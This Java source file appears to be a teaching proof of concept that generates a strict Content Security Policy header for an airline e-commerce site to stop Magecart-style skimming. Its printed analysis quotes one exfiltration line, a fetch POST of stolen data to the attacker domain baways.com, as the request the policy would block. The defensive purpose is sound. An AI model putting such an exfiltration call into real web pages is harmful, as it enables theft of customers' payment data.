/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Main.java to edit this template
 */
package cspgenerator;

/**
 * Proof of Concept: Mitigating Data Exfiltration
 * This program generates a strict Content Security Policy (CSP) HTTP response header.
 * It is designed to block unauthorized script execution and prevent stolen data 
 * from being sent to malicious domains like the one use in the Magecart attack.
 */
public class CSPHeaderGenerator {
    
    public static void main(String[] args) {
        System.out.println("--- BA E-Commerce: Content Security Policy (CSP) Generator ---\n");
        
        // Step 1: Define the strict security directives
        // 'self' restricts loading and sending data ONLY to the exact domain serving the site (britishairways.com)
        String defaultSrc = "default-src 'self';";
        
        // Restrict where the script can be loaded from (block malicious external scripts)
        String scriptSrc = "script-src 'self' https://trusted-cdn.com;";
        
        // Restrict where the browser is allowed to send data (AJAX, FETCH API, WebSockets)
        String connectSrc = "connect-src 'self' https://api.britishairways.com;";
        
        // Enforces that all connections must be over HTTPS
        String blockAllMixedContent = "block-all-mixed-content;";
        
        // Step 2: Assemble the final CSP header payload
        StringBuilder cspHeader = new StringBuilder();
        cspHeader.append(defaultSrc).append(" ")
                 .append(scriptSrc).append(" ")
                 .append(connectSrc).append(" ")
                 .append(blockAllMixedContent).append(" ");
        
        System.out.println("[SECURE] Generated HTTP Response Header:");
        System.out.println("Content-Security-Policy: " + cspHeader.toString());
        
        // Step 3: Security Analysis Output
        System.out.println("\n[ANALYSIS] If the Magecart script attempts to execute:");
        System.out.println("fetch('https://baways.com/log', { method: 'POST', body: stolenData });");
        System.out.println("The browswer will intercept the request, check the 'connect-src' directive,");
        System.out.println("and explicitly BLOCK the transmission because 'baways.com' is not whitelisted.");
    }
    
}
